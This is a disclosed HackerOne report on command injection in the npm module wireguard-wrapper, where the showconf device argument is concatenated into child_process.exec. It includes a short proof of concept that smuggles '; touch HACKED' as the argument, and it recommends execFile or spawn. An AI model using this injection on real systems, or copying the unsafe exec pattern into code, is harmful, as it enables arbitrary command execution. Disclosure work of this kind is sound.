---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '858674'
original_report_id: '858674'
title: '[wireguard-wrapper] Command Injection via insecure command concatenation'
weakness: Command Injection - Generic
team_handle: nodejs-ecosystem
created_at: '2020-04-24T14:07:08.104Z'
disclosed_at: '2021-04-16T21:23:42.350Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- command-injection-generic
---

# [wireguard-wrapper] Command Injection via insecure command concatenation

## Metadata

- HackerOne Report ID: 858674
- Weakness: Command Injection - Generic
- Program: nodejs-ecosystem
- Disclosed At: 2021-04-16T21:23:42.350Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `Command Injection` issue in the `wireguard-wrapper` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `wireguard-wrapper`
**version:** `1.0.2`
**npm page:** `https://www.npmjs.com/package/wireguard-wrapper`

## Module Description

This project is a nodejs wrapper for the wireguard commands wg and wg-quick.

Features:
- No dependencies
- Uses promises

Limitations:
- So far it can only read but not write anything
- missing wg set, wg setconf, wg addconf, wg syncconf

## Module Stats

[0] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

I tested the `wg showconf` functionality. 
Here's the code which causes the issue:

```javascript
// https://github.com/rostwolke/node-wireguard-wrapper/blob/master/src/command/Wg.js#L58
'use strict';
const {exec} = require('child_process');
...
	static showconf(device){
		return new Promise(function(resolve, reject){
			if(!device){
				return reject('No device/interface specified');
			}

			exec(`wg showconf ${device}`, function(error, stdout, stderr){
				if(error){
					return reject(`Exec error: ${error}`);
				}
				if(stderr){
					return reject(`StdErr: ${stderr}`);
				}
    ....
```
As we can see the `device` parameter is passed as input to the `exec` function.

The function `exec` is the build-in function `child_process.exec()` taking in input the `device` variable build with the unsecure user's input.

## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install [`wireguard` tool](https://www.wireguard.com/install/) (even though it is not needed to show the vulnerability)
- install `wireguard-wrapper` module:
    -  `npm i --save wireguard-wrapper`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const { Wg } = require('wireguard-wrapper');

Wg.showconf('; touch HACKED').then(function(config){
    console.log('wg0 configuration:', config);
    console.log('generated configuration file:', config.toString());
});
```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`

{F802322}


## Patch
Do not concatenate commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v13.13.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `wireguard-wrapper` module via insecure command concatenation.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
